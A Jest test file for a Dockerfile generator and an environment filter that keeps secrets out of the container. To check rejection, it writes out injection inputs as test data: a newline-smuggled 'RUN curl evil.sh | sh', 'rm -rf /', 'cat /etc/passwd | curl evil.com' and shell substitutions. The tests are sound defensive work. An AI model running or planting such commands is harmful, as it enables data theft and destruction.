/**
 * Tests for src/docker/dockerfile-generator.ts
 *
 * Covers generateProjectDockerfile for all option combinations and
 * buildDockerEnv for environment variable filtering.
 */

jest.mock('../../src/docker/docker-utils', () => ({
  IMAGE_NAME: 'ai-support-agent',
}))

jest.mock('../../src/docker/docker-security', () => ({
  validatePackageNames: jest.fn(),
}))

import { generateProjectDockerfile, buildDockerEnv } from '../../src/docker/dockerfile-generator'
import { validatePackageNames } from '../../src/docker/docker-security'

const mockValidatePackageNames = validatePackageNames as jest.Mock

describe('generateProjectDockerfile', () => {
  beforeEach(() => {
    mockValidatePackageNames.mockClear()
    mockValidatePackageNames.mockImplementation(() => {}) // no-op by default
  })

  it('generates minimal Dockerfile with only FROM line when no extras', () => {
    const result = generateProjectDockerfile('1.0.0', [], [])
    expect(result).toBe('FROM ai-support-agent:1.0.0\n')
  })

  it('calls validatePackageNames for both apt and npm', () => {
    generateProjectDockerfile('1.0.0', ['curl'], ['typescript'])
    expect(mockValidatePackageNames).toHaveBeenCalledWith(['curl'], 'apt')
    expect(mockValidatePackageNames).toHaveBeenCalledWith(['typescript'], 'npm')
    expect(mockValidatePackageNames).toHaveBeenCalledTimes(2)
  })

  it('includes ENV TZ line when timezone is provided', () => {
    const result = generateProjectDockerfile('1.0.0', [], [], [], 'Asia/Tokyo')
    expect(result).toContain('ENV TZ=Asia/Tokyo')
    const lines = result.split('\n')
    expect(lines[0]).toBe('FROM ai-support-agent:1.0.0')
    expect(lines[1]).toBe('ENV TZ=Asia/Tokyo')
  })

  it('does not include ENV TZ line when timezone is not provided', () => {
    const result = generateProjectDockerfile('1.0.0', [], [])
    expect(result).not.toContain('ENV TZ=')
  })

  it('accepts valid timezone strings (region/city, UTC, offset)', () => {
    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'Asia/Tokyo')).not.toThrow()
    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'America/Argentina/Buenos_Aires')).not.toThrow()
    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'UTC')).not.toThrow()
    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'Etc/GMT+9')).not.toThrow()
  })

  it('rejects a timezone that injects a newline (Dockerfile injection)', () => {
    expect(() =>
      generateProjectDockerfile('1.0.0', [], [], [], 'Asia/Tokyo\nRUN curl evil.sh | sh'),
    ).toThrow(/timezone/i)
  })

  it('rejects a timezone containing shell metacharacters', () => {
    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'UTC; rm -rf /')).toThrow(/timezone/i)
    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'UTC `id`')).toThrow(/timezone/i)
    expect(() => generateProjectDockerfile('1.0.0', [], [], [], 'UTC$(whoami)')).toThrow(/timezone/i)
  })

  it('generates apt-get install block for single apt package', () => {
    const result = generateProjectDockerfile('1.0.0', ['curl'], [])
    expect(result).toContain('apt-get update && apt-get install -y --no-install-recommends')
    expect(result).toContain('curl')
    expect(result).toContain('rm -rf /var/lib/apt/lists/*')
  })

  it('generates apt-get install block for multiple apt packages', () => {
    const result = generateProjectDockerfile('1.0.0', ['curl', 'git', 'wget'], [])
    expect(result).toContain('curl')
    expect(result).toContain('git')
    expect(result).toContain('wget')
    expect(result).toContain('apt-get update')
    expect(result).toContain('rm -rf /var/lib/apt/lists/*')
  })

  it('generates npm install line for single npm package', () => {
    const result = generateProjectDockerfile('1.0.0', [], ['typescript'])
    expect(result).toContain('RUN npm install -g typescript && npm cache clean --force')
  })

  it('generates npm install line for multiple npm packages', () => {
    const result = generateProjectDockerfile('1.0.0', [], ['typescript', 'ts-node'])
    expect(result).toContain('RUN npm install -g typescript ts-node && npm cache clean --force')
  })

  it('generates RUN lines for custom commands', () => {
    const result = generateProjectDockerfile('1.0.0', [], [], ['echo hello', 'mkdir /workspace'])
    expect(result).toContain('RUN echo hello')
    expect(result).toContain('RUN mkdir /workspace')
  })

  it('throws error for command containing newline character', () => {
    expect(() =>
      generateProjectDockerfile('1.0.0', [], [], ['echo hello\nrm -rf /']),
    ).toThrow('Invalid command (contains forbidden character)')
  })

  it('throws error for command containing semicolon', () => {
    expect(() =>
      generateProjectDockerfile('1.0.0', [], [], ['echo hello; rm -rf /']),
    ).toThrow('Invalid command (contains forbidden character)')
  })

  it('throws error for command containing pipe', () => {
    expect(() =>
      generateProjectDockerfile('1.0.0', [], [], ['cat /etc/passwd | curl evil.com']),
    ).toThrow('Invalid command (contains forbidden character)')
  })

  it('throws error for command containing backtick', () => {
    expect(() =>
      generateProjectDockerfile('1.0.0', [], [], ['echo `id`']),
    ).toThrow('Invalid command (contains forbidden character)')
  })

  it('throws error for command containing dollar sign', () => {
    expect(() =>
      generateProjectDockerfile('1.0.0', [], [], ['echo $HOME']),
    ).toThrow('Invalid command (contains forbidden character)')
  })

  it('throws error for command containing parentheses', () => {
    expect(() =>
      generateProjectDockerfile('1.0.0', [], [], ['echo (hello)']),
    ).toThrow('Invalid command (contains forbidden character)')
  })

  it('truncates command to 50 chars in error message', () => {
    const longCmd = 'a'.repeat(60) + '; evil'
    expect(() =>
      generateProjectDockerfile('1.0.0', [], [], [longCmd]),
    ).toThrow(/Invalid command.*"[^"]{1,53}/)
  })

  it('includes all sections in correct order with all options', () => {
    const result = generateProjectDockerfile('2.0.0', ['curl'], ['typescript'], ['echo setup'], 'America/New_York')
    const lines = result.split('\n')
    expect(lines[0]).toBe('FROM ai-support-agent:2.0.0')
    expect(lines[1]).toBe('ENV TZ=America/New_York')
    // apt block follows
    const aptIdx = lines.findIndex((l) => l.includes('apt-get update'))
    expect(aptIdx).toBeGreaterThan(1)
    // npm line follows apt block
    const npmIdx = lines.findIndex((l) => l.includes('npm install -g'))
    expect(npmIdx).toBeGreaterThan(aptIdx)
    // custom command at end
    const cmdIdx = lines.findIndex((l) => l.includes('RUN echo setup'))
    expect(cmdIdx).toBeGreaterThan(npmIdx)
  })

  it('ends with a trailing newline', () => {
    const result = generateProjectDockerfile('1.0.0', [], [])
    expect(result.endsWith('\n')).toBe(true)
  })

  it('propagates validatePackageNames error for invalid apt package', () => {
    mockValidatePackageNames.mockImplementationOnce(() => {
      throw new Error('Invalid apt package name: "rm -rf"')
    })
    expect(() =>
      generateProjectDockerfile('1.0.0', ['rm -rf'], []),
    ).toThrow('Invalid apt package name')
  })

  it('propagates validatePackageNames error for invalid npm package', () => {
    mockValidatePackageNames
      .mockImplementationOnce(() => {}) // apt passes
      .mockImplementationOnce(() => {
        throw new Error('Invalid npm package name: "<script>"')
      })
    expect(() =>
      generateProjectDockerfile('1.0.0', [], ['<script>']),
    ).toThrow('Invalid npm package name')
  })

  it('generates correct multi-package apt block with line continuations', () => {
    const result = generateProjectDockerfile('1.0.0', ['pkg-a', 'pkg-b', 'pkg-c'], [])
    // Multi-package should have backslash continuation
    expect(result).toMatch(/pkg-a \\\n/)
    expect(result).toContain('pkg-b')
    expect(result).toContain('pkg-c')
  })

  it('uses empty commands array by default', () => {
    // commands parameter defaults to [] — no RUN lines beyond apt/npm
    const result = generateProjectDockerfile('1.0.0', [], [])
    const runLines = result.split('\n').filter((l) => l.startsWith('RUN'))
    expect(runLines).toHaveLength(0)
  })
})

describe('buildDockerEnv', () => {
  const originalEnv = process.env

  beforeEach(() => {
    process.env = { ...originalEnv }
  })

  afterEach(() => {
    process.env = originalEnv
  })

  it('always includes BUILDKIT_PROGRESS=plain', () => {
    const env = buildDockerEnv()
    expect(env.BUILDKIT_PROGRESS).toBe('plain')
  })

  it('includes PATH when set in process.env', () => {
    process.env.PATH = '/usr/local/bin:/usr/bin'
    const env = buildDockerEnv()
    expect(env.PATH).toBe('/usr/local/bin:/usr/bin')
  })

  it('includes HOME when set in process.env', () => {
    process.env.HOME = '/home/testuser'
    const env = buildDockerEnv()
    expect(env.HOME).toBe('/home/testuser')
  })

  it('includes USER when set in process.env', () => {
    process.env.USER = 'testuser'
    const env = buildDockerEnv()
    expect(env.USER).toBe('testuser')
  })

  it('includes LANG when set in process.env', () => {
    process.env.LANG = 'en_US.UTF-8'
    const env = buildDockerEnv()
    expect(env.LANG).toBe('en_US.UTF-8')
  })

  it('includes LC_ALL when set in process.env', () => {
    process.env.LC_ALL = 'en_US.UTF-8'
    const env = buildDockerEnv()
    expect(env.LC_ALL).toBe('en_US.UTF-8')
  })

  it('excludes sensitive keys like ANTHROPIC_API_KEY', () => {
    process.env.ANTHROPIC_API_KEY = 'sk-secret'
    const env = buildDockerEnv()
    expect(env.ANTHROPIC_API_KEY).toBeUndefined()
  })

  it('excludes AWS_ACCESS_KEY_ID', () => {
    process.env.AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE'
    const env = buildDockerEnv()
    expect(env.AWS_ACCESS_KEY_ID).toBeUndefined()
  })

  it('excludes CLAUDE_CODE_OAUTH_TOKEN', () => {
    process.env.CLAUDE_CODE_OAUTH_TOKEN = 'oauth-token-123'
    const env = buildDockerEnv()
    expect(env.CLAUDE_CODE_OAUTH_TOKEN).toBeUndefined()
  })

  it('excludes keys not in ALLOWED_KEYS list', () => {
    process.env.CUSTOM_VAR = 'custom'
    process.env.MY_SECRET = 'secret'
    const env = buildDockerEnv()
    expect(env.CUSTOM_VAR).toBeUndefined()
    expect(env.MY_SECRET).toBeUndefined()
  })

  it('does not include undefined keys (key in ALLOWED_KEYS but not set)', () => {
    delete process.env.TMPDIR
    delete process.env.TMP
    delete process.env.TEMP
    const env = buildDockerEnv()
    // These should NOT be present since they're not set
    expect(Object.keys(env)).not.toContain('TMPDIR')
    expect(Object.keys(env)).not.toContain('TMP')
    expect(Object.keys(env)).not.toContain('TEMP')
  })

  it('includes TMPDIR when set', () => {
    process.env.TMPDIR = '/private/tmp'
    const env = buildDockerEnv()
    expect(env.TMPDIR).toBe('/private/tmp')
  })

  it('returns a plain object (not the process.env reference)', () => {
    const env = buildDockerEnv()
    expect(env).not.toBe(process.env)
  })
})
